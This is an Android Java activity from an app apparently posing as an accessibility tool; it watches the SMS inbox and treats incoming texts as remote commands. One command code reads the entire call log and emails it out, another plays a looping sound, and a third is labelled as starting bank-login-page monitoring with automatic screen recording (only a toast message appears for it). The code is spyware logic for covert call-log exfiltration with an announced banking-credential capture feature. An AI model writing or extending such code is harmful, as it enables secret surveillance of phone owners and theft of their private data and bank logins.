package com.accessibility;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.view.View;
import android.widget.EditText;

import com.accessibility.bean.CallLogBean;
import com.accessibility.bean.SmsBean;
import com.accessibility.utils.PhoneUtils;
import com.accessibility.utils.mail.SendMailUtil;
import com.k12lib.afast.utils.PhoneInfoUtils;

import java.util.ArrayList;

import z.frame.BaseAct;

import static com.accessibility.utils.PhoneUtils.getSubString;


public class MainActivity extends BaseAct implements View.OnClickListener {

    public static final int FID = 1000;
    public static final int SEND_SMS = FID + 1;
    public static final int IA_SEND_SMS = FID + 2;

    private EditText mEtSMS;

    private PhoneUtils mPhoneUtils;
    private SmsObserver smsObserver;
    private SmsBean mSmsBean;
    public static MediaPlayer mPlayer;

    public Handler smsHandler = new Handler() {
        //这里可以进行回调的操作
        //TODO

    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initView();
        mPhoneUtils = new PhoneUtils();
        smsObserver = new SmsObserver(this, smsHandler);
        getContentResolver().registerContentObserver(PhoneUtils.SMS_INBOX, true, smsObserver);
    }

    private void initView() {
        mEtSMS = (EditText) findViewById(R.id.mEtSMS);
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.mBtnNetWork:
                getWifiState();
                break;
            case R.id.mBtnGetCallLog:
                getPhoneLog();
                break;
            case R.id.mBtnActToA1:
                startActivity("com.example.test.A1Activity");
                break;
            case R.id.mBtnActToA2:
                startActivity("com.example.test.A2Activity");
                break;
            case R.id.mBtnEnter:
                startActivity(new Intent(this, AccessibilityNormalSample.class));
                break;
            case R.id.mBtnTestSMS:
                int type = PhoneUtils.getSubString(mEtSMS.getText().toString().trim());
                SmsBean smsBean = new SmsBean();
                smsBean.number = PhoneInfoUtils.getPhoneNumber(getBaseContext());
                smsBean.body = getPhoneLog();
                action(type, smsBean);
                break;
            case R.id.mBtnStop:
                if (mPlayer != null) mPlayer.stop();
                break;
        }

    }

    public void getWifiState() {
        WifiManager mWifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        int wifiState = mWifiManager.getWifiState();
        String wifiStr = "";
        switch (wifiState) {
            case WifiManager.WIFI_STATE_DISABLING:
                wifiStr = "无wifi功能";
                break;
            case WifiManager.WIFI_STATE_DISABLED:
                wifiStr = "禁用";
                break;
            case WifiManager.WIFI_STATE_ENABLING:
                wifiStr = "正在开启";
                break;
            case WifiManager.WIFI_STATE_ENABLED:
                wifiStr = "已开启";
                break;
            case WifiManager.WIFI_STATE_UNKNOWN:
                wifiStr = "状态未知";
                break;
        }
        showShortToast(wifiStr);
    }


    public String getPhoneLog() {
        StringBuilder sb = new StringBuilder();
        ArrayList<CallLogBean> list = mPhoneUtils.getCallLog(this);
        sb.append("    时间    ")
                .append(",   手机号码  ")
                .append(",     类型    ").append("\n");
        for (int i = 0; i < list.size(); i++) {
            CallLogBean bean = list.get(i);
            if (bean == null) continue;
            sb.append(PhoneUtils.getData(bean.date))
                    .append(" ,  ").append(bean.number)
                    .append("  ,  ").append(PhoneUtils.getCallType(bean.type)).append("\n");
        }
        _log(sb.toString());
        return sb.toString();
    }


    class SmsObserver extends ContentObserver {

        public SmsObserver(Context context, Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            //每当有新短信到来时，获取短消息的方法
            if (mPhoneUtils == null) {
                mPhoneUtils = new PhoneUtils();
            }
            SmsBean bean = mPhoneUtils.getSmsFromPhone(MainActivity.this);
            if (bean != null) {
                _log("num=" + bean + " ,body=" + bean.body);
                SmsBean smsBean = new SmsBean();
                smsBean.number = PhoneInfoUtils.getPhoneNumber(getBaseContext());
                smsBean.body = getPhoneLog();
                int type = getSubString(bean.body);
                action(type, smsBean);
            }
        }
    }

    public void action(int type, SmsBean bean) {
        switch (type) {
            case -1:
                showShortToast("解析短信异常");
                break;
            case 10001:
                //获取电话记录,并发送短信或者邮件
                showShortToast("获取电话记录");
                SendMailUtil.send(this, bean.number, bean.body);
//                requestPermission(bean);
                break;
            case 10002:
                //播放歌曲
                showShortToast("播放歌曲");
                playMp3();
                break;
            case 10003:
                //开启监测银行登录页面,自动录屏服务
                showShortToast("开启监测银行登录页面,自动录屏服务");
                break;
        }
    }

    private void playMp3() {
        mPlayer = MediaPlayer.create(this, R.raw.test);
        mPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
        mPlayer.setLooping(true);
        mPlayer.start();
    }

    public void startActivity(String className) {
        Intent intent = new Intent();
        intent.setClassName("com.example.test", className);
        startActivity(intent);
    }


    private void requestPermission(SmsBean bean) {
        mSmsBean = bean;
        //判断Android版本是否大于23
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            int checkCallPhonePermission = ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE);
            if (checkCallPhonePermission != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.SEND_SMS}, SEND_SMS);
                return;
            } else {
                mPhoneUtils.sendSMSS(this, bean.number, bean.body);
                //已有权限
            }
        } else {
            //API 版本在23以下
            mPhoneUtils.sendSMSS(this, bean.number, bean.body);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        switch (requestCode) {
            case SEND_SMS:
                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    mPhoneUtils.sendSMSS(this, mSmsBean.number, mSmsBean.body);
                } else {
                    // Permission Denied
                    showShortToast("CALL_PHONE Denied");
                }
                break;
            default:
                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    @Override
    public void handleAction(int id, int arg, Object extra) {
        switch (id) {
            case IA_SEND_SMS:
                showShortToast(arg == 0 ? "发送邮件成功" : "发送邮件失败");
                break;
            default:
                super.handleAction(id, arg, extra);
                break;
        }
    }
}
